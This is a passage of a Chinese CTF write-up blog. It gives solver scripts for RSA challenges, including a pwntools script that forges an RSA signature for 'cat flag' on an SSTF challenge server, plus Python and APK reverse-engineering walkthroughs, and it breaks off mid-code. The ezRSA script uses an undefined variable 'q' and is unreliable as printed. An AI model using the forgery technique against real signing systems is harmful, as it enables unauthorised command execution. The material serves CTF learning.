<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nc rsa101.sstf.site 1104</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"></span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[RSA parameters]&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, <span class="built_in">hex</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, <span class="built_in">hex</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">msg</span>):</span></span><br><span class="line">	m = bytes_to_long(msg)</span><br><span class="line">	s = <span class="built_in">pow</span>(m, d, n)</span><br><span class="line">	<span class="keyword">return</span> long_to_bytes(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">s</span>):</span></span><br><span class="line">	s = bytes_to_long(s)</span><br><span class="line">	v = <span class="built_in">pow</span>(s, e, n)</span><br><span class="line">	<span class="keyword">return</span> long_to_bytes(v)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">welcome</span>():</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\nWelcome to command signer/executor.&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Menu : 1. Verify and run the signed command&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;       2. Generate a signed command&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;       3. Base64 encoder&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;       4. Exit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	welcome()</span><br><span class="line">	sel = <span class="built_in">input</span>(<span class="string">&quot; &gt; &quot;</span>).strip()</span><br><span class="line">	<span class="keyword">if</span> sel == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">		sgn = <span class="built_in">input</span>(<span class="string">&quot;Signed command: &quot;</span>).strip()</span><br><span class="line">		sgn = b64decode(sgn)</span><br><span class="line">		cmd = verify(sgn)</span><br><span class="line"></span><br><span class="line">		commands = [<span class="string">&quot;ls -l&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;id&quot;</span>, <span class="string">&quot;cat flag&quot;</span>]</span><br><span class="line">		<span class="keyword">if</span> cmd.decode() <span class="keyword">in</span> commands:</span><br><span class="line">			system(cmd)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Possible commands: &quot;</span>, commands)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> sel == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">		cmd = <span class="built_in">input</span>(<span class="string">&quot;Base64 encoded command to sign: &quot;</span>)</span><br><span class="line">		cmd = b64decode(cmd)</span><br><span class="line">		<span class="keyword">if</span> cmd == <span class="string">b&quot;cat flag&quot;</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;It&#x27;s forbidden.&quot;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Signed command:&quot;</span>, b64encode(sign(cmd)).decode())</span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> sel == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">		cmd = <span class="built_in">input</span>(<span class="string">&quot;String to encode: &quot;</span>).strip().encode()</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Base64 encoded string:&quot;</span>, b64encode(cmd).decode())</span><br><span class="line"></span><br><span class="line">	<span class="keyword">elif</span> sel == <span class="string">&quot;4&quot;</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;bye.&quot;</span>)</span><br><span class="line">		exit()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Invalid selection.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>大致意思是要用d给<code>cat flag</code>的字节流进行加密才能真正获得flag，这个过程相当于用RSA签名；但是<code>cat flag</code>被滤过，有web那味儿了</p>
<p>虽然可以获得用同一个d签名后的<code>ls -l</code>，<code>pwd</code>，<code>id</code>，但仔细一想并不能构成什么攻击，我的解释是因为虽然有过了一段时间就换密钥的说法，但是才3次应该还不构成攻击；这条路行不通</p>
<p>不知道有没有命令行的绕过方法，比如用<code>;</code>之类的</p>
<p>瞄了一眼提示哦，好；既然另外三个没什么软用，直接从<code>cat flag</code>下手，易得<code>bytes_to_long(b&#39;cat flag&#39;)=7161132565001953639=103 * 408479 * 170205956447</code>，全部不行就一个一个来，最后因为遵从<br>$$<br>m^d\equiv (m_1m_2m_3)^d\equiv (m_1^d\ mod\ n)(m_2^d\ mod\ n)(m_3^d\ mod\ n)\equiv c\ (mod\ n)<br>$$<br>就可以成功在最后拼凑成<code>cat flag</code>，并执行</p>
<p>这个没想到需要好好反思下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nc rsa101.sstf.site 1104.</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;rsa101.sstf.site&#x27;</span>, <span class="number">1104</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;n =&#x27;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(sh.recvline().decode()[<span class="number">3</span>:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">cf = <span class="string">b&#x27;cat flag&#x27;</span></span><br><span class="line">cf = bytes_to_long(cf)</span><br><span class="line">d = factor(cf)</span><br><span class="line">mi = []</span><br><span class="line">m = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(d)):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Base64 encoded command to sign:&#x27;</span>)</span><br><span class="line">    sh.sendline(b64encode(long_to_bytes(d[i][<span class="number">0</span>])))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Signed command:&#x27;</span>)</span><br><span class="line">    mi.append(sh.recvline())</span><br><span class="line">    m *= bytes_to_long(b64decode(mi[i]))</span><br><span class="line"></span><br><span class="line">m = m % n</span><br><span class="line"><span class="comment"># sh.recvuntil(b&#x27;v&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Signed command:&#x27;</span>)</span><br><span class="line">sh.sendline(b64encode(long_to_bytes(m)))</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-RCfour"><a href="#Crypto-RCfour" class="headerlink" title="Crypto-RCfour"></a>Crypto-RCfour</h2><p>kw人家把网站关掉了，都怪我太拖延</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>OSINT</tag>
      </tags>
  </entry>
  <entry>
    <title>20210830 8月DASCrypto方向WP</title>
    <url>/posts/67d634b2/</url>
    <content><![CDATA[<p>怕没时间复现？在比赛中复现吧！ko no DAS8月赛 da</p>
<span id="more"></span>

<h1 id="DAS"><a href="#DAS" class="headerlink" title="DAS"></a>DAS</h1><h2 id="Crypto-easymath"><a href="#Crypto-easymath" class="headerlink" title="Crypto-easymath"></a>Crypto-easymath</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()) &lt; <span class="number">50</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">str</span>(<span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read(), byteorder=<span class="string">&#x27;big&#x27;</span>) &lt;&lt; <span class="number">10000</span>).endswith(</span><br><span class="line">    <span class="string">&#x27;1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>代码很短，也可以直接搜到原题</p>
<p><code>bytesorder=&#39;big&#39;</code>可以理解是正常的顺序</p>
<p>主要是觉得很神奇，左移10000位，然后只告诉了低579位，真的可以还原吗？</p>
<p>不过用数学语言来表达就习惯多了<br>$$<br>c=flag\times 2^{10000}\ mod\ 10^{175}<br>$$<br>相当于取了个余；只要求出$2^{10000}$在模$10^{175}$下的逆元就行，这不是有手就行，但显然这个逆元并不存在，但问题不大，稍微变一下<br>$$<br>c=flag\times 2^{10000}\ mod\ 5^{175}<br>$$</p>
<hr>
<p>因为有性质，如果$a\equiv b\ (mod\ n),\ a\equiv b\ (mod\ m),\ (m, n)=1$，则$a\equiv b(mod\ mn)$</p>
<hr>
<p>感觉反着来也成立的吧，显然$(2^{175},\ 5^{175})=1$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">5</span> ** <span class="number">175</span></span><br><span class="line">c = <span class="number">1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008</span></span><br><span class="line">c = c</span><br><span class="line">phi = <span class="number">5</span> ** <span class="number">174</span></span><br><span class="line">e = <span class="number">2</span> ** <span class="number">10000</span></span><br><span class="line">d = invert(e, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c * d % n))</span><br></pre></td></tr></table></figure>

<p>主要还是这条性质吧，其他的一些解法像是更底层一点的</p>
<h2 id="Crypto-ezRSA"><a href="#Crypto-ezRSA" class="headerlink" title="Crypto-ezRSA"></a>Crypto-ezRSA</h2><p>这个ez诚不欺我</p>
<p>直接转化成等于的形式，然后取个gcd，因为取出来可能不是正好是n和p，所以用分解攻击factordb剔除小因子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">plain1 = <span class="number">3796374001</span></span><br><span class="line">cipher1 = <span class="number">10814407739419442187905858785036186878265127046318055454993453460552141704269761831133605965488334657725928223663072928135729092442048892277444747664105855191494328013597494843840801624660190005877515193495251116322331333145225214492628388272052283297261629247983765384231471683884012700575979269960065526415802023634510913009036934242220680865773837250316443624988133196570064551438174112950794689256211630478109685814880608384948776450292755634359375937804770120858228075005653177911703351120582838064680054557165091424216996781206537691443956931890710761301856045586473958014856501026856223946554632634123695548179</span></span><br><span class="line">plain2 = <span class="number">4274439796</span></span><br><span class="line">cipher2 = <span class="number">87226798597265930735797832586236279967789468186786741246367414679613517601654025942029826295922574046522178393263827646913102970456195019295401416652274787934598801006209685121040719655143935749480878915637540137699100422932935519357118466505812144970497483991623024823375063776302868706571808198638413485212863316779488625319157322436072639726910982871292474427111853478193221459564153774349503133897947087219144794655871631028877397232372688447849203202066982834256420368807780090246093374914035033275326840206150648030439511140807548259558987343365751983159445433804444373606478977126329710773866415852267322001</span></span><br><span class="line">plain3 = <span class="number">3325291543</span></span><br><span class="line">cipher3 = <span class="number">9382727308462526071828291861625444755821341794212101844314359460079432045375739882063652976611283182057033881092525502333782051326520856709162727825183042333495142759484340360567209663928461296371430651153068234201274220444046746723715852931539307137462642852266744794350148429783596186264775135674497726336356558991142315096962405777053398974439740872315007701981484005150026915096332916499718849929261683668753849212760142928383699802276667736418472263282318556853006287601969938973761042341846844526359073801116843895009315716346895596793683181704835335051683309743931741006154082213663428178283831538866255884755</span></span><br><span class="line">plain4 = <span class="number">1344652736</span></span><br><span class="line">cipher4 = <span class="number">4321964026676773781748104809247153356237715067039867231031624087256207483823813596319043458347848480918702592529113491431289681396399509022324524505867856178311958890363168588728856811216344821674576551978795805425938895529979965804450330107190184989162075120112336133813443406172261019202954524704870212620162773467949822492505161759519710435619043135693162949516270801813957833639117255071409629966835262468558867355399456489652824578176999147239152024128878816180401772196756218195440508847291475372211289300191672193680292568402473128269561454972660235893426215596184157205084579301349999511988743927089317168711</span></span><br><span class="line">c = <span class="number">7676870019429280974392994820719779231294040954319033563743135447473572416831050516949578774541281865709413894823796173396916557712257817949278444474172193939467995392598453462557057904995693840979847693206445078435907817047607948884368740596897139479299803522434307154541548742050088306413312454547460881877229439237898277933224023743845054110141568593673519203476919586868299617487091772845879027851695029674390129630380608842037317291970843742534837090616445063709778227810263198355145168049129671663511533431798983910771539362325095830241252453404715144468588527605118717772056998732396545216696090692231228929195</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = gcd(plain1**e-cipher1, plain3**e-cipher3) // <span class="number">2</span></span><br><span class="line">p = gcd(plain2**e-cipher2, plain4**e-cipher4) // <span class="number">65</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br></pre></td></tr></table></figure>

<p>放sage里跑好了</p>
<h2 id="Crypto-let’s-play-with-rsa"><a href="#Crypto-let’s-play-with-rsa" class="headerlink" title="Crypto-let’s play with rsa~"></a>Crypto-let’s play with rsa~</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;***************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span>():</span></span><br><span class="line">    p=getprime(<span class="number">1024</span>)</span><br><span class="line">    q=getprime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    n=p*q</span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Hello,let&#x27;s play rsa~\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Now,I make some numbers,wait a second\n&#x27;</span></span><br><span class="line">    n1=getprime(<span class="number">200</span>)</span><br><span class="line">    n2=getprime(<span class="number">200</span>)</span><br><span class="line">    number=n1*n2</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Ok,i will send two numbers to you,one of them was encoded.\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Encode n1:%d,\n&quot;</span>%(<span class="built_in">pow</span>(n1,e,n))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;And n2:%d.\n&quot;</span>%n2</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Information that can now be made public:the public key (n,e):(%d,%d)\n&quot;</span>%(n,e)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c=<span class="built_in">int</span>(raw_input(<span class="string">&quot;ok,now,tell me the value of the number (encode it for safe):&quot;</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Sorry,the input is illeagal, and the integer is accept~&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="keyword">if</span> m==number:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;It&#x27;s easy and interesting,didn&#x27;t it?\n&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;This is the gift for you :&quot;</span>+flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Emmmmm,there is something wrong, bye~\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    play()</span><br></pre></td></tr></table></figure>

<p>简单性质的应用，想让我们给出$c=(n_1\times n_2)^e\ mod\ n$，提供了n和e，以及$c_1=n_1^e\ mod\ n$和$n_2$，这还不简单<br>$$<br>c=(n_1^e\ mod\ n\cdot n_2^e\ mod\ n)\ mod\ n=(c_1\cdot n_2^e\ mod\ n)\ mod\ n<br>$$<br>直接手撕，才三血</p>
<h2 id="Re-py"><a href="#Re-py" class="headerlink" title="Re-py"></a>Re-py</h2><p>看出的人比较多，想肯定有原题，然后就搜到了这位师傅的<a href="https://blog.csdn.net/z_Fuck/article/details/109479960">博客</a>，一些python的反编译操作，学到了；不太懂原理，我这里简单列下步奏</p>
<p>首先用PE工具看下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210830152655257.png" alt="image-20210830152655257"></p>
<p>不知道哪里不对，但是用PEiD看，会告诉你是一个无效的exe文件</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210830152749825.png" alt="image-20210830152749825"></p>
<p>说是用python打包的exe文件，反编译一下，使用github的<code>pyinstxtractor.py</code>工具</p>
<p><code>python pyinstxtractor.py py.exe</code></p>
<p>会得到一个文件夹，需要关注没有后缀名的<code>py</code>和<code>struct</code>，用查看内码的软件打开，将<code>struct</code>文件开头和<code>py</code>不一样的代码给拷贝到<code>py</code>处，保存成<code>.pyc</code>文件</p>
<p>然后用<code>uncompyle6</code>反编译的成源文件，直接用<code>pip install uncompyle</code>即可安装</p>
<p><code>uncompyle6 py.pyc py.py</code></p>
<p>得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        res = <span class="built_in">ord</span>(s[i]) ^ <span class="number">32</span></span><br><span class="line">        res += <span class="number">31</span></span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="string">&#x27;ek`fz13b3c5e047b`bd`0/c268e600e7c5d1`|&#x27;</span></span><br><span class="line">strings = <span class="string">&#x27;&#x27;</span></span><br><span class="line">strings = <span class="built_in">input</span>(<span class="string">&#x27;Input:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> encode(strings) == m:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Correct!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Try again!&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后逆回去就好了</p>
<h2 id="Re-apkrev"><a href="#Re-apkrev" class="headerlink" title="Re-apkrev"></a>Re-apkrev</h2><p><em>逆向都是2020华为武汉研究所网络安全峰会CTF的题目，但是网上只能搜到一位师傅写的WP，偏偏这道题他没有更，看来要多搜集点逆向师傅的博客</em></p>
<p>第一次真正意义上逆向，之前都是闹着玩，现在看着ida的伪代码慢慢琢磨了</p>
<p>显示基操，用模拟器打开，发现要输入一个注册码，然后安卓逆向工具去分析，找到MainActivity中的onClick，发现关键的函数<code>myCheck</code>被隐藏了，搜了下，藏在<code>.so</code>文件里了，所以将<code>.apk</code>改成<code>.zip</code>然后解压找到</p>
<p>说是类似RC4的流密码，但看伪代码好吃力啊</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Java_com_example_re_MainActivity_myCheck</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// x20</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// x0</span></span><br><span class="line">  __int64 v5; <span class="comment">// x19</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// x21</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// x22</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// w21</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// x19</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// x20</span></span><br><span class="line">  <span class="keyword">size_t</span> v11; <span class="comment">// w0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// w20</span></span><br><span class="line">  _DWORD *v13; <span class="comment">// x0</span></span><br><span class="line">  <span class="keyword">int32x4_t</span> v14; <span class="comment">// q0</span></span><br><span class="line">  __int64 v15; <span class="comment">// x8</span></span><br><span class="line">  <span class="keyword">int32x4_t</span> v16; <span class="comment">// q1</span></span><br><span class="line">  <span class="keyword">int32x4_t</span> v17; <span class="comment">// q2</span></span><br><span class="line">  <span class="keyword">char</span> *v18; <span class="comment">// x9</span></span><br><span class="line">  <span class="keyword">int32x4_t</span> v19; <span class="comment">// q3</span></span><br><span class="line">  __int64 v20; <span class="comment">// x8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v21; <span class="comment">// w11</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// w9</span></span><br><span class="line">  <span class="keyword">char</span> *v23; <span class="comment">// x10</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// w13</span></span><br><span class="line">  <span class="keyword">char</span> *v25; <span class="comment">// x14</span></span><br><span class="line">  __int64 v26; <span class="comment">// x9</span></span><br><span class="line">  __int64 v27; <span class="comment">// x10</span></span><br><span class="line">  __int64 v28; <span class="comment">// x8</span></span><br><span class="line">  <span class="keyword">char</span> *v29; <span class="comment">// x12</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// w14</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// w16</span></span><br><span class="line">  __int64 v32; <span class="comment">// x9</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v34; <span class="comment">// [xsp+8h] [xbp-268h] BYREF</span></span><br><span class="line">  __int64 v35; <span class="comment">// [xsp+10h] [xbp-260h]</span></span><br><span class="line">  <span class="keyword">char</span> *v36; <span class="comment">// [xsp+18h] [xbp-258h]</span></span><br><span class="line">  __int128 dest[<span class="number">33</span>]; <span class="comment">// [xsp+20h] [xbp-250h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">  v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="number">1352LL</span>))(a1, a3, <span class="number">0LL</span>);</span><br><span class="line">  v34 = <span class="number">0LL</span>;</span><br><span class="line">  v35 = <span class="number">0LL</span>;</span><br><span class="line">  v36 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(v3);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt;= <span class="number">0x17</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (v4 + <span class="number">16</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF0</span>LL;</span><br><span class="line">    v6 = (<span class="keyword">char</span> *)<span class="keyword">operator</span> <span class="keyword">new</span>(v7);</span><br><span class="line">    v35 = v5;</span><br><span class="line">    v36 = v6;</span><br><span class="line">    v34 = v7 | <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = (<span class="keyword">char</span> *)&amp;v34 + <span class="number">1</span>;</span><br><span class="line">  LOBYTE(v34) = <span class="number">2</span> * v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">LABEL_5:</span><br><span class="line">    <span class="built_in">memcpy</span>(v6, v3, v5);</span><br><span class="line">  v6[v5] = <span class="number">0</span>;</span><br><span class="line">  dest[<span class="number">30</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">31</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">28</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">29</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">26</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">27</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">24</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">25</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">22</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">23</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">20</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">21</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">18</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">19</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">16</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">17</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">14</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">15</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">12</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">13</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">10</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">11</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">8</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">9</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">7</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">5</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">6</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">3</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">4</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">1</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">2</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">0</span>] = <span class="number">0u</span>;</span><br><span class="line">  fflush(&amp;_sF);</span><br><span class="line">  v8 = v34;</span><br><span class="line">  v9 = v36;</span><br><span class="line">  <span class="keyword">if</span> ( (v34 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    v10 = v36;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v10 = (<span class="keyword">char</span> *)&amp;v34 + <span class="number">1</span>;</span><br><span class="line">  v11 = <span class="built_in">strlen</span>(v10);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, v10, v11);</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)dest) != <span class="number">32LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_23:</span><br><span class="line">    <span class="keyword">if</span> ( (v8 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> 